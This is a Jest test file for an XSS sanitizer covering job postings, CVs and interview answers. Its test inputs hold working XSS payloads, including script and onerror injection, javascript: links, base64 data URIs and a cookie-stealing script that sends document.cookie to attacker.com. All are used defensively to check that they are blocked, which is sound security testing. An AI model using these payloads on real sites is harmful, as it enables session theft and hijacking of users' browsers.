// __tests__/security-xss.test.ts - Comprehensive XSS security testing
import {
  sanitizeJobPosting,
  sanitizeUserCV,
  sanitizeUserAnswer,
  getPerformanceComparison,
} from "../src/lib/dompurify-enhanced";

describe("XSS Security Protection Tests", () => {
  describe("Job Posting Sanitization", () => {
    const testXSSPayloads = [
      // Basic script injection
      {
        name: "Script tag injection",
        input: '<script>alert("XSS")</script>Software Engineer position',
        expectedBlock: true,
      },
      // Event handler injection
      {
        name: "Event handler injection",
        input: '<img src=x onerror=alert("XSS")>Senior Developer role',
        expectedBlock: true,
      },
      // JavaScript protocol
      {
        name: "JavaScript protocol",
        input: "<a href=\"javascript:alert('XSS')\">Apply now</a>",
        expectedBlock: true,
      },
      // CSS expression
      {
        name: "CSS expression",
        input:
          "<div style=\"expression(alert('XSS'))\">Frontend Engineer</div>",
        expectedBlock: true,
      },
      // Iframe injection
      {
        name: "Iframe injection",
        input:
          "<iframe src=\"javascript:alert('XSS')\"></iframe>Backend Developer",
        expectedBlock: true,
      },
      // Base64 XSS
      {
        name: "Base64 XSS",
        input:
          '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">',
        expectedBlock: true,
      },
    ];

    testXSSPayloads.forEach(({ name, input, expectedBlock }) => {
      test(`should block ${name}`, () => {
        const result = sanitizeJobPosting(input);

        expect(result.sanitized).toBeDefined();
        expect(result.threatsDetected).toBeDefined();

        if (expectedBlock) {
          expect(result.threatsDetected.length).toBeGreaterThan(0);
          // Verify dangerous content is removed
          expect(result.sanitized).not.toContain("<script>");
          expect(result.sanitized).not.toContain("javascript:");
          expect(result.sanitized).not.toContain("onerror=");
          expect(result.sanitized).not.toContain("onclick=");
        }
      });
    });

    test("should handle legitimate HTML content", () => {
      const legitimateInput = `
        <h2>Senior Software Engineer</h2>
        <p>We are looking for an experienced developer.</p>
        <ul>
          <li>5+ years of experience</li>
          <li>Strong problem-solving skills</li>
        </ul>
        <strong>Requirements:</strong> React, TypeScript, Node.js
      `;

      const result = sanitizeJobPosting(legitimateInput);

      expect(result.sanitized).toContain("Senior Software Engineer");
      expect(result.sanitized).toContain("5+ years of experience");
      expect(result.threatsDetected.length).toBe(0);
    });

    test("should measure performance", () => {
      const input = '<script>alert("test")</script>Job posting content';
      const startTime = performance.now();
      const result = sanitizeJobPosting(input);
      const endTime = performance.now();

      expect(result.performance.time).toBeGreaterThanOrEqual(0);
      expect(endTime - startTime).toBeLessThan(100); // Should complete within 100ms
    });
  });

  describe("User CV Sanitization", () => {
    test("should sanitize user CV content", () => {
      const maliciousCV = `
        <h1>John Doe</h1>
        <p><script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script></p>
        <p>Experience: 5 years at <img src="x" onerror="alert('XSS')">Tech Corp</p>
        <p>Skills: JavaScript, React <span onclick="stealData()">View More</span></p>
      `;

      const result = sanitizeUserCV(maliciousCV);

      expect(result.sanitized).not.toContain("<script>");
      expect(result.sanitized).not.toContain("onerror=");
      expect(result.sanitized).not.toContain("onclick=");
      expect(result.sanitized).toContain("John Doe");
      expect(result.sanitized).toContain("Experience");
      expect(result.threatsDetected.length).toBeGreaterThan(0);
    });

    test("should preserve legitimate formatting in CV", () => {
      const legitimateCV = `
        <h2>Professional Summary</h2>
        <p>Experienced software developer with expertise in full-stack development.</p>
        <h3>Experience</h3>
        <p><strong>Senior Developer</strong> at TechCorp (2020-2023)</p>
        <ul>
          <li>Led team of 5 developers</li>
          <li>Implemented microservices architecture</li>
        </ul>
      `;

      const result = sanitizeUserCV(legitimateCV);

      expect(result.sanitized).toContain("Professional Summary");
      expect(result.sanitized).toContain("Senior Developer");
      expect(result.sanitized).toContain("TechCorp");
      expect(result.threatsDetected.length).toBe(0);
    });
  });

  describe("User Answer Sanitization", () => {
    test("should strictly sanitize user answers", () => {
      const maliciousAnswer = `
        I have experience with JavaScript and React.
        <script>fetch('/api/steal-data', {method: 'POST', body: userData})</script>
        <img src="x" onerror="alert('XSS')">
        My previous project: <iframe src="evil.com"></iframe>
      `;

      const result = sanitizeUserAnswer(maliciousAnswer);

      expect(result.sanitized).not.toContain("<script>");
      expect(result.sanitized).not.toContain("<img");
      expect(result.sanitized).not.toContain("<iframe");
      expect(result.sanitized).toContain(
        "I have experience with JavaScript and React"
      );
      expect(result.threatsDetected.length).toBeGreaterThan(0);
    });

    test("should allow basic formatting in answers", () => {
      const formattedAnswer = `
        **Project Overview**
        - Built a full-stack application using React and Node.js
        - Implemented real-time features with WebSockets
        - *Led a team of 3 developers*
        
        **Key Achievements:**
        1. Increased performance by 40%
        2. Reduced bugs by 60%
      `;

      const result = sanitizeUserAnswer(formattedAnswer);

      // Should preserve the text content even if HTML is removed
      expect(result.sanitized).toContain("Project Overview");
      expect(result.sanitized).toContain("Built a full-stack application");
      expect(result.sanitized).toContain("Increased performance by 40%");
    });
  });

  describe("Performance Comparison", () => {
    test("should track sanitization performance", () => {
      const testInputs = [
        "Clean content",
        '<script>alert("xss")</script>Content',
        '<img src="x" onerror="alert(1)">Content',
        "<p>Normal paragraph</p>",
      ];

      testInputs.forEach((input, index) => {
        const result = sanitizeJobPosting(input);
        expect(result.performance.time).toBeGreaterThanOrEqual(0);
      });

      const performanceStats = getPerformanceComparison();
      expect(performanceStats).toBeDefined();
      if (performanceStats) {
        expect(performanceStats.totalOperations).toBeGreaterThanOrEqual(
          testInputs.length
        );
      }
    });
  });

  describe("Edge Cases", () => {
    test("should handle empty inputs", () => {
      const emptyInput = "";
      const result = sanitizeJobPosting(emptyInput);
      expect(result.sanitized).toBe("");
      expect(result.threatsDetected.length).toBe(0);
    });

    test("should handle null/undefined inputs", () => {
      expect(() => sanitizeJobPosting("")).not.toThrow();
      expect(() => sanitizeUserCV("")).not.toThrow();
      expect(() => sanitizeUserAnswer("")).not.toThrow();
    });

    test("should handle very large inputs", () => {
      const largeInput = "A".repeat(10000) + '<script>alert("XSS")</script>';
      const startTime = performance.now();
      const result = sanitizeJobPosting(largeInput);
      const endTime = performance.now();

      expect(result.sanitized.length).toBeLessThan(largeInput.length);
      expect(endTime - startTime).toBeLessThan(500); // Should complete within 500ms for large content
    });

    test("should handle nested script tags", () => {
      const nestedScript =
        "<script>outer<script>nested</script>code</script>Content";
      const result = sanitizeJobPosting(nestedScript);

      expect(result.sanitized).toBe("Content");
      expect(result.threatsDetected.length).toBeGreaterThan(0);
    });
  });
});

describe("Integration Tests", () => {
  test("should work with the interview workflow", () => {
    // Simulate the full interview workflow with potentially malicious input
    const jobPosting = `
      <h1>Software Engineer Position</h1>
      <p>We need someone with experience in <script>alert('xss')</script>React</p>
      <img src="x" onerror="stealData()">
      <p>Apply at <a href="javascript:alert('xss')">our website</a></p>
    `;

    const userCV = `
      <h2>Jane Developer</h2>
      <p>Experience: <iframe src="evil.com"></iframe>5 years</p>
      <p>Skills: JavaScript, React <span onclick="alert('xss')">More</span></p>
    `;

    const userAnswer = `
      I have experience with React and JavaScript.
      <script>document.location='http://evil.com'</script>
      <img src="x" onerror="alert('xss')">
    `;

    // Test job posting sanitization
    const jobResult = sanitizeJobPosting(jobPosting);
    expect(jobResult.sanitized).toContain("Software Engineer Position");
    expect(jobResult.sanitized).not.toContain("<script>");
    expect(jobResult.sanitized).not.toContain("javascript:");

    // Test user CV sanitization
    const cvResult = sanitizeUserCV(userCV);
    expect(cvResult.sanitized).toContain("Jane Developer");
    expect(cvResult.sanitized).not.toContain("<iframe>");
    expect(cvResult.sanitized).not.toContain("onclick=");

    // Test user answer sanitization
    const answerResult = sanitizeUserAnswer(userAnswer);
    expect(answerResult.sanitized).toContain(
      "I have experience with React and JavaScript"
    );
    expect(answerResult.sanitized).not.toContain("<script>");
    expect(answerResult.sanitized).not.toContain("<img");
  });
});
